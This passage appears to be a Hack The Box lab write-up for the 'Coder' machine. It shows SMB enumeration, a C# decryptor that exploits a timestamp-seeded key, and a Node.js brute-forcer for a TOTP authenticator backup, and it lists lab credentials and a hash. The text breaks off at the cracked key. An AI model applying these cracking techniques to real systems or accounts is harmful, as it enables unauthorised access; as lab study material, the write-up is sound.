---
tags:
  - HTB/Insane/Coder
  - HTB/Windows
  - Windows/AD/ADCS/ESC1
  - Windows/AD/ADCS/ESC4
  - TeamCity/CICD
  - Authenticator/TOTP
  - Binary/ReverseEng/dotNET
sticker: emoji//1f5a5-fe0f
---

![](https://cdn.discordapp.com/attachments/1071118357933338645/1188051954212032552/Coder.png?ex=65991e9a&is=6586a99a&hm=b06b372363b95a9ba780d3143fe739227236d2ba2280edef42a313f20ca9d6f4&)

##  Machine Summary

Coder was one of the best machines I have ever done on HTB. This machine starts by enumerating the SMB shares via the anonymous login and finding the `s.blade.enc` and the `Encryptor.exe` (.NET binary), by running the `Encryptor.exe` you can decrypt the `s.blade.enc` and you get a `KeePass` DB and the key. At this stage you will get the credentials and backup of the `Authenticator` 2FA for s.blade to login to the TeamCity CI/CID, after a login attempt you will see that you have to enter a `TOTP`. With the backup file provided you should be able to recover the `MasterKey`, read the source code of the plugin and reverse engineer the `import.ts`. After that the coding part starts, a custom script to brute force the encryption key and recover the `MasterKey`. Once you have the key, you can import the backup file into the plugin and use the `TOTP` to login to the CI/CD. After that you should upload a diff file to get reverse shell on the server. So now we have a session as `svc_teamcity` and we can find a `PS Secure String` in `C:\ProgramData` and by decrypting the `Secure String` we get the password for `e.black`. The privilege escalation part was pretty straightforward. e.black is in the `PKI Admins` group and has full control over the PK infrastructure. By adding a vulnerable template, we can request a ticket on behalf of the administrator and use that to dump the administrator hash.

## Recon

```ad-summary
title: NMAP
collapse: open

```BEGIN
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-26 17:27:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
|_ssl-date: 2023-12-26T17:27:53+00:00; +7h58m26s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2023-12-26T17:27:53+00:00; +7h58m26s from scanner time.
| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US
| Not valid before: 2022-11-04T17:25:43
|_Not valid after:  2032-11-01T17:25:43
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
|_ssl-date: 2023-12-26T17:27:53+00:00; +7h58m26s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
|_ssl-date: 2023-12-26T17:27:54+00:00; +7h58m26s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-26T17:27:53+00:00; +7h58m26s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-12-26T17:27:49
|_  start_date: N/A
|_clock-skew: mean: 7h58m25s, deviation: 0s, median: 7h58m25s

```

```ad-important
title: Domains
collapse: open

- **coder.htb**
- **dc01.coder.htb**
- **teamcity-dev.coder.htb**
```

```ad-error
title: Found Credentials
collapse: open

- s.blade:veh5nUSZFFoqz9CrrhSeuwhA (TeamCity)
- Administrator:807726fcf9f188adc26eeafd7dc16bb7
- e.black:ypOSJXPqlDOxxbQSfEERy300
```

We have the usual Windows Server ports, but let's start with SMB first.

SMB Anonymous login is allowed and we can log in without any credentials. Great, now lets list all the shares available on the network.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ netexec smb coder.htb -u ' ' -p ''
SMB         10.129.229.190  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.190  445    DC01             [+] coder.htb\ :
```

We have the following stocks. The 'Development' share sounds interesting, let's have a look and see what we can find in this share.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ netexec smb coder.htb -u ' ' -p '' --shares
SMB         10.129.229.190  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.190  445    DC01             [+] coder.htb\ :
SMB         10.129.229.190  445    DC01             [*] Enumerated shares
SMB         10.129.229.190  445    DC01             Share           Permissions     Remark
SMB         10.129.229.190  445    DC01             -----           -----------     ------
SMB         10.129.229.190  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.190  445    DC01             C$                              Default share
SMB         10.129.229.190  445    DC01             Development     READ
SMB         10.129.229.190  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.190  445    DC01             NETLOGON                        Logon server share
SMB         10.129.229.190  445    DC01             SYSVOL                          Logon server share
SMB         10.129.229.190  445    DC01             Users           READ
```

So now we have to wait for the `smbclient` to dump the hole data into development shares. But now we can check the web site on port 80.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189142560011198546/image.png?ex=659d164f&is=658aa14f&hm=e6890bf52756380544f772eca272bc75a2bbb1ee8843169f691625fc635aa85e&)

As we can see there was nothing special, the default `IIS` web page.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/…/HTB/Machines/Coder/Migrations]
└─$ ls
   rwxr-xr-x   3   ar0x   ar0x      4 KiB   Tue Dec 26 10:39:10 2023    adcs_reporting/
   rwxr-xr-x   3   ar0x   ar0x      4 KiB   Tue Dec 26 10:39:11 2023    bootstrap-template-master/
   rwxr-xr-x   3   ar0x   ar0x      4 KiB   Tue Dec 26 10:39:11 2023    Cachet-2.4/
   rwxr-xr-x   3   ar0x   ar0x      4 KiB   Tue Dec 26 10:39:11 2023    kimchi-master/
   rwxr-xr-x   3   ar0x   ar0x      4 KiB   Tue Dec 26 10:39:11 2023    teamcity_test_repo/
```

So some names are very familiar to me, `teamcity` is `Jetbrains CI/CD`.

```ad-info
title: TeamCity

TeamCity is a Continuous Integration and Deployment server that provides out-of-the-box continuous unit testing, code quality analysis, and early reporting on build problems. A simple installation process lets you deploy TeamCity and start improving your release management practices in a matter of minutes. TeamCity supports Java, .NET, and Ruby development and integrates perfectly with major IDEs, version control systems, and issue tracking systems.
```

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/…/Machines/Coder/Migrations/teamcity_test_repo]
└─$ ls
   rw-r--r--   1   ar0x   ar0x     67 B     Tue Dec 26 10:39:11 2023   ✓    hello_world.ps1

┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/…/Machines/Coder/Migrations/teamcity_test_repo]
└─$ cat hello_world.ps1
#Simple repo test for Teamcity pipeline
write-host "Hello, World!"
```

Inside the folder we have the `hello_world.ps1` script, which tells us that this script is being run for testing purposes. 

We may be able to abuse this later to gain access to the machine. But not sure, it is just a prediction.

Things get interesting after that, I found `Encrypter.exe` and `s.blade.enc` in the `Temporary Projects` folder.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/…/HTB/Machines/Coder/Temporary Projects]
└─$ ls
   rw-r--r--   1   ar0x   ar0x      5 KiB   Tue Dec 26 10:39:10 2023    Encrypter.exe
   rw-r--r--   1   ar0x   ar0x      3 KiB   Tue Dec 26 10:39:10 2023    s.blade.enc
```

## Initial Access
#### Shell as svc_teamcity
##### Encryptor Reversing

So the `Encrypter.exe` is a `.NET` application, and we can reverse it very quickly and easily.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/…/HTB/Machines/Coder/Temporary Projects]
└─$ file Encrypter.exe
Encrypter.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

This application's functionality is very simple.

```csharp
public static void Main(string[] args)
{
	if (args.Length != 1)
	{
		Console.WriteLine("You must provide the name of a file to encrypt.");
		return;
	}
	FileInfo fileInfo = new FileInfo(args[0]);
	string destFile = Path.ChangeExtension(fileInfo.Name, ".enc");
	long value = DateTimeOffset.Now.ToUnixTimeSeconds();
	Random random = new Random(Convert.ToInt32(value));
	byte[] array = new byte[16];
	random.NextBytes(array);
	byte[] array2 = new byte[32];
	random.NextBytes(array2);
	byte[] array3 = EncryptFile(fileInfo.Name, destFile, array2, array);
}
```

It takes the filename and uses the current time (which is converted to a unix timestamp) as a seed and generates a random key and iv.

```csharp
private static byte[] EncryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
{
	using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
	{
		using FileStream stream = new FileStream(destFile, FileMode.Create);
		using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(Key, IV);
		using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
		using FileStream fileStream = new FileStream(sourceFile, FileMode.Open);
		byte[] array = new byte[1024];
		int count;
		while ((count = fileStream.Read(array, 0, array.Length)) != 0)
		{
			cryptoStream.Write(array, 0, count);
		}
	}
	return null;
}
```

And the `EncryptFile` method gets the `filename`, `destination file`, `key` and `iv` and it will just encrypt the contents of the file with the `RijndaelManaged (AES)` algorithm.

So it is very simple, but the problem is that the key and iv are randomly generated. So we can recover it without any additional information. But we have the encrypted file. That means we can check the last modification time and so we can recover the seed. And the last step is to change the `EncryptFile` to `DecryptFile`.

##### Get Encryption Time

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/Coder/Temporary Projects]
└─$ stat s.blade.enc
  File: s.blade.enc
  Size: 3808            Blocks: 8          IO Block: 4096   regular file
Device: 8,1     Inode: 4194520     Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/    ar0x)   Gid: ( 1000/    ar0x)
Access: 2023-12-26 11:00:25.166406307 +0100
Modify: 2023-12-26 10:39:10.502606601 +0100
Change: 2023-12-26 10:39:10.502606601 +0100
 Birth: 2023-12-26 10:39:10.410606001 +0100
```

So we can see that the times are modified after i downloaded this file on my system. BUT the file has still the correct information in the Development Share folder.

So lets see if we can get the correct time from this file. So we can just mount the smb share to our system and than check the file information with `stat` again.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ sudo mount -t cifs //`box`/Development /mnt/development
Password for root@//10.129.229.190/Development:
```

*Just hit enter for the password*

```bash
┌──(ar0x㉿kali)-[/mnt/development/Temporary Projects]
└─$ stat s.blade.enc
  File: s.blade.enc
  Size: 3808            Blocks: 8          IO Block: 1048576 regular file
Device: 0,69    Inode: 1125899907128474  Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2022-11-11 23:17:08.374350100 +0100
Modify: 2022-11-11 23:17:08.374350100 +0100
Change: 2022-11-11 23:17:08.374350100 +0100
 Birth: 2022-11-07 22:05:02.949637700 +0100
```

And it looks much better than before. Great, now we have the correct modification time. Now we have to convert this time to `unixtime stamp` and then we can use it in our `decryptor`.

```bash
┌──(ar0x㉿kali)-[/mnt/development/Temporary Projects]
└─$ date -d "2022-11-11 23:17:08.374350100 +0100" +"%s"
1668205028
```

##### Writing the Decryptor 

And here we got our timestamp. NICE

```csharp
using System.Security.Cryptography;

static byte[] DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
{
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
        using FileStream stream = new FileStream(destFile, FileMode.Create);
        using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(Key, IV);
        using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
        using FileStream fileStream = new FileStream(sourceFile, FileMode.Open);
        byte[] array = new byte[1024];
        int count;
        while ((count = fileStream.Read(array, 0, array.Length)) != 0)
        {
            cryptoStream.Write(array, 0, count);
        }
    }
    return null;
}

string sourceFile = "C:/Users/ar0x/Desktop/HTB/Coder/s.blade.enc";
string destFile = "C:/Users/ar0x/Desktop/HTB/Coder/s.blade.txt";

long seed = 1668205028;

Random random = new Random(Convert.ToInt32(seed));

byte[] iv = new byte[16];
random.NextBytes(iv);

byte[] key = new byte[32];
random.NextBytes(key);

DecryptFile(sourceFile, destFile, key, iv);

Console.WriteLine("File Decrypted, check the s.blade.txt file");
```

So now I have taken some of the source code and built my own `decryptor`, so lets run it and see what we get after decrypting the file.

```bash
c:\Users\ar0x\Desktop\HTB\Coder
λ file s.blade.txt
s.blade.txt: 7-zip archive data, version 0.4
```

##### Access Teamcity server

###### Recovering the KeePass Creds

So this a 7-zip file, lets rename the extension to `7z` to extract the files that are zipped.

```bash
c:\Users\ar0x\Desktop\HTB\Coder
λ ls -la
total 18
drwxrwxrwx   1 user     group           0 Dec 26 03:03 .
drwxrwxrwx   1 user     group           0 Dec 26 02:00 ..
-rw-rw-rw-   1 user     group        1024 Nov  3  2022 .key
drwxrwxrwx   1 user     group           0 Dec 26 02:16 Decryptor
-rwxrwxrwx   1 user     group        5632 Dec 26 01:39 Encrypter.exe
-rw-rw-rw-   1 user     group        3799 Dec 26 02:56 s.blade.7z
-rw-rw-rw-   1 user     group        3808 Dec 26 01:39 s.blade.enc
-rw-rw-rw-   1 user     group        2590 Nov 11  2022 s.blade.kdbx
```

OHHH, we got a `kdbx` file and a `.key` file so lets open the `s.blade.kdbx` file and see what is waiting for us.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189162254944448624/image.png?ex=659d28a7&is=658ab3a7&hm=5c89eb64bc48b701b0c307ec05a3b8ad8a5991d0ce56e0fa994abb3577a35419&)

The fucking `TeamCity` I told you guys. So now we have a new `vhost` `https://teamcity-dev.coder.htb`  and the credentials for `s.blade` for the CI/CD and we also found the `Authenticator backup codes`.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189162826435145811/image.png?ex=659d292f&is=658ab42f&hm=e95b0337c3f6ead2b33ac16fe8887ac3c98063eeb9e8795dc66efb60b653c8c1&)

```json
{
  "6132e897-44a2-4d14-92d2-12954724e83f": {
    "encrypted": true,
    "hash": "6132e897-44a2-4d14-92d2-12954724e83f",
    "index": 1,
    "type": "totp",
    "secret": "U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2",
    "issuer": "TeamCity",
    "account": "s.blade"
  },
  "key": {
    "enc": "U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1",
    "hash": "$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV"
  }
}
```

And sadly the password is not valid for AD.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ netexec smb coder.htb -u 's.blade' -p 'veh5nUSZFFoqz9CrrhSeuwhA'
SMB         10.129.229.190  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.190  445    DC01             [-] coder.htb\s.blade:veh5nUSZFFoqz9CrrhSeuwhA STATUS_LOGON_FAILURE
```

So let's login with these creds and see what we can do on TeamCity.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189164705697251328/image.png?ex=659d2aef&is=658ab5ef&hm=471a49d1127b58f3c9031b71a4a1a3914cd5a6efc2674fa67e73c216aa2216dc&)

And get fucked 🫠. So now the `Authenticator backup codes` makes sense. I taught that's just here.

###### Identifying the Application/Plugin

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189165614619697223/image.png?ex=659d2bc8&is=658ab6c8&hm=bad507e3c732b30d667ea2e29e667480f6f92926c25818c847490d26c9d88ff3&)

So based on the saved name in `keepass`, i search for Authenticator in Firefox plugins and i found out that apparently this the used plugin for MFA.
So and this plugin allow us to import and export backup files. I tried to import the file that we got, and what a surprise we should have the master key.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189166949431771156/image.png?ex=659d2d06&is=658ab806&hm=0b055fb6469ba1604728424e19cf8b2c73003160b65fa5701a969dbe5ea0ffd7&)

That was fist time that i worked with this plugin and i had no idea about it. So i started to play with it. I added a manual entry, and its very important that you enter a long password, because short passwords are invalid and you cant create a entry.

```
ar0x:VulnLabBetterThanHTB
```

![](https://cdn.discordapp.com/attachments/1071118357933338645/1189168864051863603/image.png?ex=659d2ece&is=658ab9ce&hm=a92987a8bdf3ad896a287591aac9f010d18510872f8e2d24803dd8f531f748e3&)

So now lets export this and see if these files are identical.

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ cat authenticator.json
{
  "e6a3e987-eb1f-46c2-afff-c5cb155b4463": {
    "encrypted": true,
    "hash": "e6a3e987-eb1f-46c2-afff-c5cb155b4463",
    "index": 0,
    "type": "totp",
    "secret": "U2FsdGVkX196FpehKG28gBu9qHZx2N1i8Rqrzs3NHZld6h12EkQ/CJ4aMcR98emb",
    "issuer": "ar0x"
  },
  "key": {
    "enc": "U2FsdGVkX18q7mO2iijnS+aGTjJBXm5hdHNNHEW3bs2V+OPbIVRBIzY1PtVxZzzMfMjv5nMk47Z0jfQ1oKj1POFeqJI7SySsINOvUEZLlJleQemWSYNp0ku+pqg/uSaFN96kPU0b7baLKvFYy91UsTKjn8EJIlSZmtZYw6HdMpdtoSwOQo2/+KHXWmbXuMm0",
    "hash": "$argon2id$v=19$m=16384,t=1,p=1$wNMNUhro7aTDYCf9Zi+7NQ$B8zfFcuIC54Nckr8NMi9LBqqwVBdQddR"
  }
}
```

```bash
┌──(netexec-aAT1m2Ox-py3.11)─(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ cat sblade_authenticator.json
{
  "6132e897-44a2-4d14-92d2-12954724e83f": {
    "encrypted": true,
    "hash": "6132e897-44a2-4d14-92d2-12954724e83f",
    "index": 1,
    "type": "totp",
    "secret": "U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2",
    "issuer": "TeamCity",
    "account": "s.blade"
  },
  "key": {
    "enc": "U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1",
    "hash": "$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV"
  }
}
```

###### Understanding the Decryption

So we can see that these files are identical, that means that sblade exported his `totp` password protected and we should somehow crack the master password to get MFA tokens.

So this plugin is open source and we can check the source code to configure out how this plugin is encrypting the master key and if we can somehow recover this key. I mean its a bit too much but i guess the only way that we have.

Repo: https://github.com/Authenticator-Extension/Authenticator

This the source code of `import.ts` this file is used when we import a backup so actually the only interesting file for us is this one. 

```ts
import Vue from "vue";
import ImportView from "./components/Import.vue";
import CommonComponents from "./components/common/index";
import { loadI18nMessages } from "./store/i18n";

import { Encryption } from "./models/encryption";
import { EntryStorage } from "./models/storage";
import { getOTPAuthPerLineFromOPTAuthMigration } from "./models/migration";
import * as CryptoJS from "crypto-js";
import * as uuid from "uuid/v4";

async function init() {
  // i18n
  Vue.prototype.i18n = await loadI18nMessages();

  // Load common components globally
  for (const component of CommonComponents) {
    Vue.component(component.name, component.component);
  }

  // Load entries to global
  const encryption = new Encryption(await getCachedPassphrase());
  const entries = await EntryStorage.get();

  if (encryption.getEncryptionStatus()) {
    for (const entry of entries) {
      await entry.applyEncryption(encryption);
    }
  }

  Vue.prototype.$entries = entries;
  Vue.prototype.$encryption = encryption;

  const instance = new Vue({
    render: (h) => h(ImportView),
  }).$mount("#import");

  // Set title
  try {
    document.title = instance.i18n.extName;
  } catch (e) {
    console.error(e);
  }
}

init();

function getCachedPassphrase() {
  return new Promise((resolve: (value: string) => void) => {
    chrome.runtime.sendMessage(
      { action: "passphrase" },
      (passphrase: string) => {
        return resolve(passphrase);
      }
    );
  });
}

export function decryptBackupData(
  backupData: { [hash: string]: OTPStorage },
  passphrase: string | null
) {
  const decryptedbackupData: { [hash: string]: OTPStorage } = {};
  for (const hash of Object.keys(backupData)) {
    if (typeof backupData[hash] !== "object") {
      continue;
    }
    if (!backupData[hash].secret) {
      continue;
    }
    if (backupData[hash].encrypted && !passphrase) {
      continue;
    }
    if (backupData[hash].encrypted && passphrase) {
      try {
        backupData[hash].secret = CryptoJS.AES.decrypt(
          backupData[hash].secret,
          passphrase
        ).toString(CryptoJS.enc.Utf8);
        backupData[hash].encrypted = false;
      } catch (error) {
        continue;
      }
    }
    // backupData[hash].secret may be empty after decrypt with wrong
    // passphrase
    if (!backupData[hash].secret) {
      continue;
    }
    decryptedbackupData[hash] = backupData[hash];
  }
  return decryptedbackupData;
}

export async function getEntryDataFromOTPAuthPerLine(importCode: string) {
  const lines = importCode.split("\n");
  const exportData: { [hash: string]: OTPStorage } = {};
  let failedCount = 0;
  let succeededCount = 0;
  for (let item of lines) {
    item = item.trim();
    if (item.startsWith("otpauth-migration:")) {
      const migrationData = getOTPAuthPerLineFromOPTAuthMigration(item);
      for (const line of migrationData) {
        lines.push(line);
      }
      continue;
    }
    if (!item.startsWith("otpauth:")) {
      continue;
    }

    let uri = item.split("otpauth://")[1];
    let type = uri.substr(0, 4).toLowerCase();
    uri = uri.substr(5);
    let label = uri.split("?")[0];
    const parameterPart = uri.split("?")[1];
    if (!parameterPart) {
      failedCount++;
      continue;
    } else {
      let secret = "";
      let account: string | undefined;
      let issuer: string | undefined;
      let algorithm: string | undefined;
      let period: number | undefined;
      let digits: number | undefined;

      try {
        label = decodeURIComponent(label);
      } catch (error) {
        console.error(error);
      }
      if (label.indexOf(":") !== -1) {
        issuer = label.split(":")[0];
        account = label.split(":")[1];
      } else {
        account = label;
      }
      const parameters = parameterPart.split("&");
      parameters.forEach((item) => {
        const parameter = item.split("=");
        if (parameter[0].toLowerCase() === "secret") {
          secret = parameter[1];
        } else if (parameter[0].toLowerCase() === "issuer") {
          try {
            issuer = decodeURIComponent(parameter[1]);
          } catch {
            issuer = parameter[1];
          }
          issuer = issuer.replace(/\+/g, " ");
        } /* else if (parameter[0].toLowerCase() === "counter") {
          let counter = Number(parameter[1]);
          counter = isNaN(counter) || counter < 0 ? 0 : counter;
        } */ else if (
          parameter[0].toLowerCase() === "period"
        ) {
          period = Number(parameter[1]);
          period =
            isNaN(period) || period < 0 || period > 60 || 60 % period !== 0
              ? undefined
              : period;
        } else if (parameter[0].toLowerCase() === "digits") {
          digits = Number(parameter[1]);
          digits = isNaN(digits) ? 6 : digits;
        } else if (parameter[0].toLowerCase() === "algorithm") {
          algorithm = parameter[1];
        }
      });

      if (!secret) {
        failedCount++;
        continue;
      } else if (
        !/^[0-9a-f]+$/i.test(secret) &&
        !/^[2-7a-z]+=*$/i.test(secret)
      ) {
        failedCount++;
        continue;
      } else {
        const hash = await uuid();
        if (
          !/^[2-7a-z]+=*$/i.test(secret) &&
          /^[0-9a-f]+$/i.test(secret) &&
          type === "totp"
        ) {
          type = "hex";
        } else if (
          !/^[2-7a-z]+=*$/i.test(secret) &&
          /^[0-9a-f]+$/i.test(secret) &&
          type === "hotp"
        ) {
          type = "hhex";
        }

        exportData[hash] = {
          account,
          hash,
          issuer,
          secret,
          type,
          encrypted: false,
          index: 0,
          counter: 0,
          pinned: false,
        };
        if (period) {
          exportData[hash].period = period;
        }
        if (digits) {
          exportData[hash].digits = digits;
        }
        if (algorithm) {
          exportData[hash].algorithm = algorithm;
        }

        succeededCount++;
      }
    }
  }

  return { exportData, failedCount, succeededCount };
}
```

This is the function that will handle our data when we want to import a new backup.

```ts
export function decryptBackupData(
  backupData: { [hash: string]: OTPStorage },
  passphrase: string | null
) {
  const decryptedbackupData: { [hash: string]: OTPStorage } = {};
  for (const hash of Object.keys(backupData)) {
    if (typeof backupData[hash] !== "object") {
      continue;
    }
    if (!backupData[hash].secret) {
      continue;
    }
    if (backupData[hash].encrypted && !passphrase) {
      continue;
    }
    if (backupData[hash].encrypted && passphrase) {
      try {
        backupData[hash].secret = CryptoJS.AES.decrypt(
          backupData[hash].secret,
          passphrase
        ).toString(CryptoJS.enc.Utf8);
        backupData[hash].encrypted = false;
      } catch (error) {
        continue;
      }
    }
    // backupData[hash].secret may be empty after decrypt with wrong
    // passphrase
    if (!backupData[hash].secret) {
      continue;
    }
    decryptedbackupData[hash] = backupData[hash];
  }
  return decryptedbackupData;
}
```

###### Brute Force the password

The `decryptBackupData` function gave me the idea to write a `password cracker`. So let's try that.

```ad-note

I’m going to brute force the password for this encrypted backup. I could potentially try to crack that Argon2 hash, but that would be _really_ slow. Alternatively, I can try to do two AES decryptions, and that won’t be slow at all.
```

So earlier I exported my `TOTP` for testing purposes, and now we can first try if I can get the `Master Key` just by passing the correct encryption password (no brute forcing yet!). So I wrote a little JS script to do this.

```js
const fs = require("fs");
const CryptoJS = require("crypto-js");
const { argv } = require("process");

let fileContent = JSON.parse(fs.readFileSync(fileContentPath).toString());

let guid = Object.keys(fileContent)[0];
let totp_secret = fileContent[guid].secret;
let enc_key = fileContent["key"].enc;

console.log("TOTP Secret: " + totp_secret);
console.log("Encrypted Key: " + enc_key);

let key = CryptoJS.AES.decrypt(enc_key, 'pass').toString();
let totp = CryptoJS.AES.decrypt(totp_secret, key).toString(CryptoJS.enc.Utf8);
console.log("\nMasterKey: " + totp);
```

First we need to decrypt our encryption key. I defined the encryption key during the backup process and in this case it is just `pass'. Now we should try to decrypt the `TOTP Secret` or `Master Key`. Lets see the result.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ node authenticator_cracker.js test authenticator.json
TOTP Secret: U2FsdGVkX1/hMpbRcrCiz1VNeKBoPBX7Qk2GqlxNRmW2384OAhvoOeBj6iXjdMNI
Encrypted Key: U2FsdGVkX1+Zh0PAvpVLRop9B7cOohHOZeK7XWX4yBVO9zNdWkBMbV7c+jxiX6MlSyQPqbLRZyxImX7ni+OblqkgFEVjZyUBuzHWXRay08upA1DAhkLhe/5jtpqe7t9YOcTb8ATfe9xTGVhqFn7DICQBODtPj4n4lKkiOF/rP8tHlo1LBUiQ8gNHvkB/BfzN

MasterKey: VulnLabBetterThanHTB
```

Great, the script actually worked, we have the decrypted 'master key' and now I have to add the brute force part to the script and then we are ready to go.

```js
const fs = require("fs");
const CryptoJS = require("crypto-js");
const { argv } = require("process");

function readFileContent(fileContentPath) {
    const fileContent = JSON.parse(fs.readFileSync(fileContentPath).toString());
    const guid = Object.keys(fileContent)[0];
    const totpSecret = fileContent[guid].secret;
    const encKey = fileContent["key"].enc;
    return { totpSecret, encKey };
}

function bruteforceEncKey(word, encKey, totpSecret) {
    try {
        const key = CryptoJS.AES.decrypt(encKey, word).toString();
        const totp = CryptoJS.AES.decrypt(totpSecret, key).toString(CryptoJS.enc.Utf8);
        if (totp.length > 15) {
            console.log("---------------------------");
            console.log("Encryption Key: " + word);
            console.log("MasterKey: " + totp);
            console.log("---------------------------");
            process.exit(0);
        }
    } catch {
        //console.log("Failed to decrypt with key: " + word);
        return;
    }
}

function main() {
    const wordlistPath = argv[2];
    const fileContentPath = argv[3];

    if (!wordlistPath || !fileContentPath) {
        console.log("Usage: node authenticator_cracker.js <wordlist> <authenticator.json>");
        process.exit(1);
    }

    const { totpSecret, encKey } = readFileContent(fileContentPath);
    const wordlist = fs.readFileSync(wordlistPath).toString().split("\n");

    wordlist.forEach((word) => {
        bruteforceEncKey(word, encKey, totpSecret);
    });
}

main();
```

So i improved the script a bit and now it looks great and is ready to use. I use `rockyout.txt`as wordlist. And after a few seconds we got the `Master Key`. Great

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/Coder]
└─$ node authenticator_cracker.js /usr/share/wordlists/rockyou.txt sblade_authenticator.json 
---------------------------
Encryption Key: skyblade
